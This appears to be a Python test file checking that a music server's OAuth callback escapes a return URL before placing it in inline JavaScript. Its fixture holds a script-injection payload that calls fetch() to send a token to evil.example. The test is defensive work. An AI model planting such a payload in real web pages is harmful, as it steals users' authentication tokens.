"""Tests for the webserver OAuth callback."""

from __future__ import annotations

from unittest.mock import AsyncMock, patch

from aiohttp import web
from aiohttp.test_utils import make_mocked_request
from music_assistant_models.auth import User, UserRole

from music_assistant.controllers.webserver.controller import WebserverController
from music_assistant.controllers.webserver.helpers.auth_providers import AuthResult
from music_assistant.helpers.json import json_dumps
from music_assistant.helpers.redirect_validation import build_code_redirect_url
from music_assistant.mass import MusicAssistant


async def test_auth_callback_serializes_script_values_safely(
    mass_minimal: MusicAssistant,
) -> None:
    """OAuth callback values cannot break out of their JavaScript string literals."""
    token = "LOCAL_TEST_TOKEN"
    return_url = (
        "https://my.home-assistant.io/'</script><script>"
        "fetch('https://evil.example/steal?t='+token)</script>\"\\\u2028\u2029"
    )
    webserver = WebserverController(mass_minimal)
    mass_minimal.webserver = webserver
    request = make_mocked_request(
        "GET",
        "/auth/callback?code=fakecode&state=fakestate&provider_id=homeassistant",
        app=web.Application(),
    )

    with (
        patch.object(
            webserver.auth,
            "handle_oauth_callback",
            new=AsyncMock(
                return_value=AuthResult(
                    success=True,
                    user=User(user_id="test", username="test", role=UserRole.USER),
                    return_url=return_url,
                )
            ),
        ),
        patch.object(webserver.auth, "create_token", new=AsyncMock(return_value=token)),
    ):
        response = await webserver._handle_auth_callback(request)

    redirect_url = build_code_redirect_url(return_url, token)
    safe_redirect_url = (
        json_dumps(redirect_url)
        .replace("&", "\\u0026")
        .replace("<", "\\u003c")
        .replace(">", "\\u003e")
        .replace("\u2028", "\\u2028")
        .replace("\u2029", "\\u2029")
    )
    assert response.status == 200
    assert response.text is not None
    assert f"const redirectUrl = {safe_redirect_url};" in response.text
    assert f"const token = {json_dumps(token)};" in response.text
